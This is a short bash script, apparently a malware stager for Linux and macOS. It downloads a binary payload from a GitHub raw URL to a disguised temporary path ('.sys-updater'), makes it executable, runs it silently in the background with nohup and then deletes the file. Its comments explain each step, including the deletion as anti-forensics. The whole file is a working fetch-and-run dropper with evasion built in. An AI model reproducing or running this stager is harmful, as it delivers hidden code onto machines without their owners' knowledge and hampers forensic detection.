#!/bin/bash

# --- Stager for Unix-like Systems ---
# This script downloads a binary, makes it executable, runs it in the background,
# and then immediately removes the on-disk file.

# URL of your final Go payload for Linux/macOS
# !! IMPORTANT: Replace this with the raw URL to your 'dtt-tools' binary !!
BIN_URL="https://raw.githubusercontent.com/aman20244/poc-bins/main/dtt-tools"


# Download to a temporary, non-obvious path
TMP_PATH="/tmp/.sys-updater-$(date +%s)"

# Download the binary quietly.
# -f: Fail silently on server errors.
# -sS: Be silent, but still show errors.
# -L: Follow redirects.
# -o: Write to a file.
curl -fsSL -o "$TMP_PATH" "$BIN_URL"

# Check if download was successful and the file exists.
if [ -f "$TMP_PATH" ]; then
    # Make the binary executable.
    chmod +x "$TMP_PATH"

    # Execute the payload in the background so this stager script can exit.
    # nohup: Prevents the process from being killed when the shell closes.
    # >/dev/null 2>&1: Redirect all stdout and stderr to null to be completely silent.
    # &: Run as a background job.
    nohup "$TMP_PATH" > /dev/null 2>&1 &

    # Immediately remove the binary from the disk after execution starts.
    # This is a classic anti-forensics technique.
    rm -f "$TMP_PATH"
fi
